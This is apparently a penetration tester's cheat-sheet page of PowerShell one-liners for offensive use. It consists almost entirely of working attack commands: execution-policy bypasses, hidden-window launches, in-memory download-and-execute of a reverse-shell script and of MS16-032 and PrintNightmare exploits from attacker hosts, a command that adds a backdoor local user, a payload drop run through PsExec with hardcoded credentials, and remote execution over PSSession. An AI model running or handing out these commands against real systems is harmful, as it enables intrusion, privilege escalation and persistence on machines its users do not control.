---
description: Get-ExecutionPolicy -List | Format-Table -AutoSize
---

# run powershell

`Import-Module .\xxx.ps1` / `. .\xxx.ps1`

cmd -> ps = `powershell -ep bypass`

{% embed url="https://www.google.com/search?oq=powershell+bypass&q=powershell+bypass+execution+policy" %}

{% hint style="info" %}
exec policy bypass
{% endhint %}

```
powershell -w h -NoP -NonI -ep Bypass
```

```
echo "cmd" | powershell -noprofile

powershell -c "cmd"
```

<pre data-overflow="wrap"><code>Get-Content .\runme.ps1 | PowerShell.exe -noprofile -

type .\runme.ps1 | PowerShell.exe -noprofile -

<strong>powershell -nop -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.129.114/rev.ps1')"
</strong>
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1

Get-Content C:\Users\ted\Desktop\PrivescCheck-master\PrivescCheck.ps1 | Out-String | IEX Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)"

</code></pre>

{% hint style="info" %}
direct run in memory from host server
{% endhint %}

{% code overflow="wrap" %}
```
powershell -NoP -NonI -W Hidden -Exec Bypass (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.132:8080/ok.exe', "C:\HFS\tmp\ok.exe"); Start-Process "C:\HFS\tmp\pse.exe -u alice -p aliceishere C:\HFS\tmp\ok.exe"

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://192.168.45.5/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'"

iex(new-object net.webclient).downloadstring('http://172.16.1.30/print_nightmare.ps1')
```
{% endcode %}

#### RCE when knowing computer name and as XXX\User (e.g.  XXX.domain.local)

```
$dcs = NEW-PSSession -Computer XXX
Invoke-Command -Session $dcs -ScriptBlock {ipconfig}

$dcs = NEW-PSSession -Computer XXX
Invoke-Command -Session $dcs -ScriptBlock {C:\Users\Public\whoami.exe}
```
